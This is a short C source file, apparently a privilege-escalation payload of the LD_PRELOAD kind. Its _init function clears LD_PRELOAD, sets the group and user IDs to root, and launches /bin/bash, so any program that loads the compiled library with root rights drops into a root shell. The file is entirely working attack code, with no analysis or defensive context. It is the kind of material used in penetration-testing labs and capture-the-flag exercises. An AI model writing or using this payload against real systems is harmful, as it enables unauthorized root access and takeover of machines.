#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
	unsetenv("LD_PRELOAD");
	// set user as root, then execute shell
	setgid(0);
	setuid(0);
	system("/bin/bash");
}
